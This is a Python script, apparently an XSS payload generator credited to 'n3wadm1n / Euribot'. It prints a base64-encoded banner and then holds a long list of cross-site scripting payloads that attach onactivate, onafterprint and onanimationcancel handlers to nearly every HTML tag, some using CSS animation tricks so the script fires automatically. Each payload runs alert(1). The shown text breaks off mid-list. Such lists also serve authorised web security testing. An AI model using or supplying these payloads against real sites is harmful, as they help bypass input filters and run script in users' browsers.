#!/usr/bin/python3
####################
################
### n3wadm1n #####
### Euribot  #####
#####################
import base64, argparse

b64_art = "X18gICBfX19fXyBfICAgX18gIF8gX19fX18gXyAgXyBfX18gX18gIF9fXyAgXyAgXyAgIApcIFxfLyAvIF8sXCB8IC9fX1x8IHxfICAgX3wgfHwgfCBfX3wgIFwvIF9ffHwgfHwgfCAgCiA+ICwgPHwgdl8vIHx8IFwvIHwgfCB8IHwgfCA+PCB8IF98fCAtPCAsXyBcYC5fICBffCAKL18vIFxfXF98IHxfX19cX18vfF98IHxffCB8X3x8X3xfX198X18vXF9fXy8gICB8X3wgCg=="
b64_bt = b64_art.encode('utf-8')
as_bt = base64.b64decode(b64_bt)
as_art = as_bt.decode('utf-8')
print(as_art)
print("\n -- - -- - -- - --\n")

def rrdd_fil(nnm_fil):
    try:
        with open(nnm_fil, 'r') as thfil:
            return thfil.read().splitlines()
    except FileNotFoundError:
        print("404 - Not Found.")
        return None

def rrdde_txxt():
    data = r"""<a id=x tabindex=1 onactivate=alert(1)></a>
<abbr id=x tabindex=1 onactivate=alert(1)></abbr>
<acronym id=x tabindex=1 onactivate=alert(1)></acronym>
<address id=x tabindex=1 onactivate=alert(1)></address>
<applet id=x tabindex=1 onactivate=alert(1)></applet>
<area id=x tabindex=1 onactivate=alert(1)></area>
<article id=x tabindex=1 onactivate=alert(1)></article>
<aside id=x tabindex=1 onactivate=alert(1)></aside>
<audio id=x tabindex=1 onactivate=alert(1)></audio>
<b id=x tabindex=1 onactivate=alert(1)></b>
<base id=x tabindex=1 onactivate=alert(1)></base>
<basefont id=x tabindex=1 onactivate=alert(1)></basefont>
<bdi id=x tabindex=1 onactivate=alert(1)></bdi>
<bdo id=x tabindex=1 onactivate=alert(1)></bdo>
<bgsound id=x tabindex=1 onactivate=alert(1)></bgsound>
<big id=x tabindex=1 onactivate=alert(1)></big>
<blink id=x tabindex=1 onactivate=alert(1)></blink>
<blockquote id=x tabindex=1 onactivate=alert(1)></blockquote>
<body id=x tabindex=1 onactivate=alert(1)></body>
<br id=x tabindex=1 onactivate=alert(1)></br>
<button id=x tabindex=1 onactivate=alert(1)></button>
<canvas id=x tabindex=1 onactivate=alert(1)></canvas>
<caption id=x tabindex=1 onactivate=alert(1)></caption>
<center id=x tabindex=1 onactivate=alert(1)></center>
<cite id=x tabindex=1 onactivate=alert(1)></cite>
<code id=x tabindex=1 onactivate=alert(1)></code>
<col id=x tabindex=1 onactivate=alert(1)></col>
<colgroup id=x tabindex=1 onactivate=alert(1)></colgroup>
<command id=x tabindex=1 onactivate=alert(1)></command>
<content id=x tabindex=1 onactivate=alert(1)></content>
<data id=x tabindex=1 onactivate=alert(1)></data>
<datalist id=x tabindex=1 onactivate=alert(1)></datalist>
<dd id=x tabindex=1 onactivate=alert(1)></dd>
<del id=x tabindex=1 onactivate=alert(1)></del>
<details id=x tabindex=1 onactivate=alert(1)></details>
<dfn id=x tabindex=1 onactivate=alert(1)></dfn>
<dialog id=x tabindex=1 onactivate=alert(1)></dialog>
<dir id=x tabindex=1 onactivate=alert(1)></dir>
<div id=x tabindex=1 onactivate=alert(1)></div>
<dl id=x tabindex=1 onactivate=alert(1)></dl>
<dt id=x tabindex=1 onactivate=alert(1)></dt>
<element id=x tabindex=1 onactivate=alert(1)></element>
<em id=x tabindex=1 onactivate=alert(1)></em>
<embed id=x tabindex=1 onactivate=alert(1)></embed>
<fieldset id=x tabindex=1 onactivate=alert(1)></fieldset>
<figcaption id=x tabindex=1 onactivate=alert(1)></figcaption>
<figure id=x tabindex=1 onactivate=alert(1)></figure>
<font id=x tabindex=1 onactivate=alert(1)></font>
<footer id=x tabindex=1 onactivate=alert(1)></footer>
<form id=x tabindex=1 onactivate=alert(1)></form>
<frame id=x tabindex=1 onactivate=alert(1)></frame>
<frameset id=x tabindex=1 onactivate=alert(1)></frameset>
<h1 id=x tabindex=1 onactivate=alert(1)></h1>
<head id=x tabindex=1 onactivate=alert(1)></head>
<header id=x tabindex=1 onactivate=alert(1)></header>
<hgroup id=x tabindex=1 onactivate=alert(1)></hgroup>
<hr id=x tabindex=1 onactivate=alert(1)></hr>
<html id=x tabindex=1 onactivate=alert(1)></html>
<i id=x tabindex=1 onactivate=alert(1)></i>
<iframe id=x tabindex=1 onactivate=alert(1)></iframe>
<image id=x tabindex=1 onactivate=alert(1)></image>
<img id=x tabindex=1 onactivate=alert(1)></img>
<input id=x tabindex=1 onactivate=alert(1)></input>
<ins id=x tabindex=1 onactivate=alert(1)></ins>
<isindex id=x tabindex=1 onactivate=alert(1)></isindex>
<kbd id=x tabindex=1 onactivate=alert(1)></kbd>
<keygen id=x tabindex=1 onactivate=alert(1)></keygen>
<label id=x tabindex=1 onactivate=alert(1)></label>
<legend id=x tabindex=1 onactivate=alert(1)></legend>
<li id=x tabindex=1 onactivate=alert(1)></li>
<link id=x tabindex=1 onactivate=alert(1)></link>
<listing id=x tabindex=1 onactivate=alert(1)></listing>
<main id=x tabindex=1 onactivate=alert(1)></main>
<map id=x tabindex=1 onactivate=alert(1)></map>
<mark id=x tabindex=1 onactivate=alert(1)></mark>
<marquee id=x tabindex=1 onactivate=alert(1)></marquee>
<menu id=x tabindex=1 onactivate=alert(1)></menu>
<menuitem id=x tabindex=1 onactivate=alert(1)></menuitem>
<meta id=x tabindex=1 onactivate=alert(1)></meta>
<meter id=x tabindex=1 onactivate=alert(1)></meter>
<multicol id=x tabindex=1 onactivate=alert(1)></multicol>
<nav id=x tabindex=1 onactivate=alert(1)></nav>
<nextid id=x tabindex=1 onactivate=alert(1)></nextid>
<nobr id=x tabindex=1 onactivate=alert(1)></nobr>
<noembed id=x tabindex=1 onactivate=alert(1)></noembed>
<noframes id=x tabindex=1 onactivate=alert(1)></noframes>
<noscript id=x tabindex=1 onactivate=alert(1)></noscript>
<object id=x tabindex=1 onactivate=alert(1)></object>
<ol id=x tabindex=1 onactivate=alert(1)></ol>
<optgroup id=x tabindex=1 onactivate=alert(1)></optgroup>
<option id=x tabindex=1 onactivate=alert(1)></option>
<output id=x tabindex=1 onactivate=alert(1)></output>
<p id=x tabindex=1 onactivate=alert(1)></p>
<param id=x tabindex=1 onactivate=alert(1)></param>
<picture id=x tabindex=1 onactivate=alert(1)></picture>
<plaintext id=x tabindex=1 onactivate=alert(1)></plaintext>
<pre id=x tabindex=1 onactivate=alert(1)></pre>
<progress id=x tabindex=1 onactivate=alert(1)></progress>
<q id=x tabindex=1 onactivate=alert(1)></q>
<rb id=x tabindex=1 onactivate=alert(1)></rb>
<rp id=x tabindex=1 onactivate=alert(1)></rp>
<rt id=x tabindex=1 onactivate=alert(1)></rt>
<rtc id=x tabindex=1 onactivate=alert(1)></rtc>
<ruby id=x tabindex=1 onactivate=alert(1)></ruby>
<s id=x tabindex=1 onactivate=alert(1)></s>
<samp id=x tabindex=1 onactivate=alert(1)></samp>
<script id=x tabindex=1 onactivate=alert(1)></script>
<section id=x tabindex=1 onactivate=alert(1)></section>
<select id=x tabindex=1 onactivate=alert(1)></select>
<shadow id=x tabindex=1 onactivate=alert(1)></shadow>
<slot id=x tabindex=1 onactivate=alert(1)></slot>
<small id=x tabindex=1 onactivate=alert(1)></small>
<source id=x tabindex=1 onactivate=alert(1)></source>
<spacer id=x tabindex=1 onactivate=alert(1)></spacer>
<span id=x tabindex=1 onactivate=alert(1)></span>
<strike id=x tabindex=1 onactivate=alert(1)></strike>
<strong id=x tabindex=1 onactivate=alert(1)></strong>
<style id=x tabindex=1 onactivate=alert(1)></style>
<sub id=x tabindex=1 onactivate=alert(1)></sub>
<summary id=x tabindex=1 onactivate=alert(1)></summary>
<sup id=x tabindex=1 onactivate=alert(1)></sup>
<svg id=x tabindex=1 onactivate=alert(1)></svg>
<table id=x tabindex=1 onactivate=alert(1)></table>
<tbody id=x tabindex=1 onactivate=alert(1)></tbody>
<td id=x tabindex=1 onactivate=alert(1)></td>
<template id=x tabindex=1 onactivate=alert(1)></template>
<textarea id=x tabindex=1 onactivate=alert(1)></textarea>
<tfoot id=x tabindex=1 onactivate=alert(1)></tfoot>
<th id=x tabindex=1 onactivate=alert(1)></th>
<thead id=x tabindex=1 onactivate=alert(1)></thead>
<time id=x tabindex=1 onactivate=alert(1)></time>
<title id=x tabindex=1 onactivate=alert(1)></title>
<tr id=x tabindex=1 onactivate=alert(1)></tr>
<track id=x tabindex=1 onactivate=alert(1)></track>
<tt id=x tabindex=1 onactivate=alert(1)></tt>
<u id=x tabindex=1 onactivate=alert(1)></u>
<ul id=x tabindex=1 onactivate=alert(1)></ul>
<var id=x tabindex=1 onactivate=alert(1)></var>
<video id=x tabindex=1 onactivate=alert(1)></video>
<wbr id=x tabindex=1 onactivate=alert(1)></wbr>
<xmp id=x tabindex=1 onactivate=alert(1)></xmp>
<xss id=x tabindex=1 onactivate=alert(1)></xss>
<body onafterprint=alert(1)>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><a id=x style="position:absolute;" onanimationcancel="alert(1)"></a>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><abbr id=x style="position:absolute;" onanimationcancel="alert(1)"></abbr>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><acronym id=x style="position:absolute;" onanimationcancel="alert(1)"></acronym>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><address id=x style="position:absolute;" onanimationcancel="alert(1)"></address>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><applet id=x style="position:absolute;" onanimationcancel="alert(1)"></applet>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><area id=x style="position:absolute;" onanimationcancel="alert(1)"></area>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><article id=x style="position:absolute;" onanimationcancel="alert(1)"></article>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><aside id=x style="position:absolute;" onanimationcancel="alert(1)"></aside>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><audio id=x style="position:absolute;" onanimationcancel="alert(1)"></audio>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><b id=x style="position:absolute;" onanimationcancel="alert(1)"></b>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><base id=x style="position:absolute;" onanimationcancel="alert(1)"></base>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><basefont id=x style="position:absolute;" onanimationcancel="alert(1)"></basefont>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><bdi id=x style="position:absolute;" onanimationcancel="alert(1)"></bdi>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><bdo id=x style="position:absolute;" onanimationcancel="alert(1)"></bdo>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><bgsound id=x style="position:absolute;" onanimationcancel="alert(1)"></bgsound>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><big id=x style="position:absolute;" onanimationcancel="alert(1)"></big>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><blink id=x style="position:absolute;" onanimationcancel="alert(1)"></blink>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><blockquote id=x style="position:absolute;" onanimationcancel="alert(1)"></blockquote>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><body id=x style="position:absolute;" onanimationcancel="alert(1)"></body>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><br id=x style="position:absolute;" onanimationcancel="alert(1)"></br>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><button id=x style="position:absolute;" onanimationcancel="alert(1)"></button>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><canvas id=x style="position:absolute;" onanimationcancel="alert(1)"></canvas>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><caption id=x style="position:absolute;" onanimationcancel="alert(1)"></caption>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><center id=x style="position:absolute;" onanimationcancel="alert(1)"></center>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><cite id=x style="position:absolute;" onanimationcancel="alert(1)"></cite>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><code id=x style="position:absolute;" onanimationcancel="alert(1)"></code>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><col id=x style="position:absolute;" onanimationcancel="alert(1)"></col>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><colgroup id=x style="position:absolute;" onanimationcancel="alert(1)"></colgroup>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><command id=x style="position:absolute;" onanimationcancel="alert(1)"></command>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><content id=x style="position:absolute;" onanimationcancel="alert(1)"></content>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><data id=x style="position:absolute;" onanimationcancel="alert(1)"></data>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><datalist id=x style="position:absolute;" onanimationcancel="alert(1)"></datalist>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dd id=x style="position:absolute;" onanimationcancel="alert(1)"></dd>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><del id=x style="position:absolute;" onanimationcancel="alert(1)"></del>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><details id=x style="position:absolute;" onanimationcancel="alert(1)"></details>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dfn id=x style="position:absolute;" onanimationcancel="alert(1)"></dfn>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dialog id=x style="position:absolute;" onanimationcancel="alert(1)"></dialog>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dir id=x style="position:absolute;" onanimationcancel="alert(1)"></dir>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><div id=x style="position:absolute;" onanimationcancel="alert(1)"></div>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dl id=x style="position:absolute;" onanimationcancel="alert(1)"></dl>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dt id=x style="position:absolute;" onanimationcancel="alert(1)"></dt>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><element id=x style="position:absolute;" onanimationcancel="alert(1)"></element>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><em id=x style="position:absolute;" onanimationcancel="alert(1)"></em>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><embed id=x style="position:absolute;" onanimationcancel="alert(1)"></embed>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><fieldset id=x style="position:absolute;" onanimationcancel="alert(1)"></fieldset>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><figcaption id=x style="position:absolute;" onanimationcancel="alert(1)"></figcaption>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><figure id=x style="position:absolute;" onanimationcancel="alert(1)"></figure>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><font id=x style="position:absolute;" onanimationcancel="alert(1)"></font>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><footer id=x style="position:absolute;" onanimationcancel="alert(1)"></footer>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><form id=x style="position:absolute;" onanimationcancel="alert(1)"></form>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><frame id=x style="position:absolute;" onanimationcancel="alert(1)"></frame>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><frameset id=x style="position:absolute;" onanimationcancel="alert(1)"></frameset>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><h1 id=x style="position:absolute;" onanimationcancel="alert(1)"></h1>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><head id=x style="position:absolute;" onanimationcancel="alert(1)"></head>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><header id=x style="position:absolute;" onanimationcancel="alert(1)"></header>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><hgroup id=x style="position:absolute;" onanimationcancel="alert(1)"></hgroup>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><hr id=x style="position:absolute;" onanimationcancel="alert(1)"></hr>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><html id=x style="position:absolute;" onanimationcancel="alert(1)"></html>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><i id=x style="position:absolute;" onanimationcancel="alert(1)"></i>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><iframe id=x style="position:absolute;" onanimationcancel="alert(1)"></iframe>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><image id=x style="position:absolute;" onanimationcancel="alert(1)"></image>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><img id=x style="position:absolute;" onanimationcancel="alert(1)"></img>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><input id=x style="position:absolute;" onanimationcancel="alert(1)"></input>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><ins id=x style="position:absolute;" onanimationcancel="alert(1)"></ins>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><isindex id=x style="position:absolute;" onanimationcancel="alert(1)"></isindex>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><kbd id=x style="position:absolute;" onanimationcancel="alert(1)"></kbd>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><keygen id=x style="position:absolute;" onanimationcancel="alert(1)"></keygen>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><label id=x style="position:absolute;" onanimationcancel="alert(1)"></label>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><legend id=x style="position:absolute;" onanimationcancel="alert(1)"></legend>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><li id=x style="position:absolute;" onanimationcancel="alert(1)"></li>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><link id=x style="position:absolute;" onanimationcancel="alert(1)"></link>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><listing id=x style="position:absolute;" onanimationcancel="alert(1)"></listing>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><main id=x style="position:absolute;" onanimationcancel="alert(1)"></main>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><map id=x style="position:absolute;" onanimationcancel="alert(1)"></map>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><mark id=x style="position:absolute;" onanimationcancel="alert(1)"></mark>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><marquee id=x style="position:absolute;" onanimationcancel="alert(1)"></marquee>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><menu id=x style="position:absolute;" onanimationcancel="alert(1)"></menu>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><menuitem id=x style="position:absolute;" onanimationcancel="alert(1)"></menuitem>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><meta id=x style="position:absolute;" onanimationcancel="alert(1)"></meta>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><meter id=x style="position:absolute;" onanimationcancel="alert(1)"></meter>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><multicol id=x style="position:absolute;" onanimationcancel="alert(1)"></multicol>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><nav id=x style="position:absolute;" onanimationcancel="alert(1)"></nav>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><nextid id=x style="position:absolute;" onanimationcancel="alert(1)"></nextid>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><nobr id=x style="position:absolute;" onanimationcancel="alert(1)"></nobr>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><noembed id=x style="position:absolute;" onanimationcancel="alert(1)"></noembed>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><noframes id=x style="position:absolute;" onanimationcancel="alert(1)"></noframes>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><noscript id=x style="position:absolute;" onanimationcancel="alert(1)"></noscript>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><object id=x style="position:absolute;" onanimationcancel="alert(1)"></object>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><ol id=x style="position:absolute;" onanimationcancel="alert(1)"></ol>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><optgroup id=x style="position:absolute;" onanimationcancel="alert(1)"></optgroup>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><option id=x style="position:absolute;" onanimationcancel="alert(1)"></option>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><output id=x style="position:absolute;" onanimationcancel="alert(1)"></output>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><p id=x style="position:absolute;" onanimationcancel="alert(1)"></p>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><param id=x style="position:absolute;" onanimationcancel="alert(1)"></param>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><picture id=x style="position:absolute;" onanimationcancel="alert(1)"></picture>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><plaintext id=x style="position:absolute;" onanimationcancel="alert(1)"></plaintext>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><pre id=x style="position:absolute;" onanimationcancel="alert(1)"></pre>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><progress id=x style="position:absolute;" onanimationcancel="alert(1)"></progress>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><q id=x style="position:absolute;" onanimationcancel="alert(1)"></q>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><rb id=x style="position:absolute;" onanimationcancel="alert(1)"></rb>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><rp id=x style="position:absolute;" onanimationcancel="alert(1)"></rp>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><rt id=x style="position:absolute;" onanimationcancel="alert(1)"></rt>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><rtc id=x style="position:absolute;" onanimationcancel="alert(1)"></rtc>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><ruby id=x style="position:absolute;" onanimationcancel="alert(1)"></ruby>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><s id=x style="position:absolute;" onanimationcancel="alert(1)"></s>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><samp id=x style="position:absolute;" onanimationcancel="alert(1)"></samp>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><script id=x style="position:absolute;" onanimationcancel="alert(1)"></script>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><section id=x style="position:absolute;" onanimationcancel="alert(1)"></section>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><select id=x style="position:absolute;" onanimationcancel="alert(1)"></select>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><shadow id=x style="position:absolute;" onanimationcancel="alert(1)"></shadow>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><slot id=x style="position:absolute;" onanimationcancel="alert(1)"></slot>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><small id=x style="position:absolute;" onanimationcancel="alert(1)"></small>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><source id=x style="position:absolute;" onanimationcancel="alert(1)"></source>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><spacer id=x style="position:absolute;" onanimationcancel="alert(1)"></spacer>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><span id=x style="position:absolute;" onanimationcancel="alert(1)"></span>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><strike id=x style="position:absolute;" onanimationcancel="alert(1)"></strike>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><strong id=x style="position:absolute;" onanimationcancel="alert(1)"></strong>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><style id=x style="position:absolute;" onanimationcancel="alert(1)"></style>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><sub id=x style="position:absolute;" onanimationcancel="alert(1)"></sub>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><summary id=x style="position:absolute;" onanimationcancel="alert(1)"></summary>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><sup id=x style="position:absolute;" onanimationcancel="alert(1)"></sup>
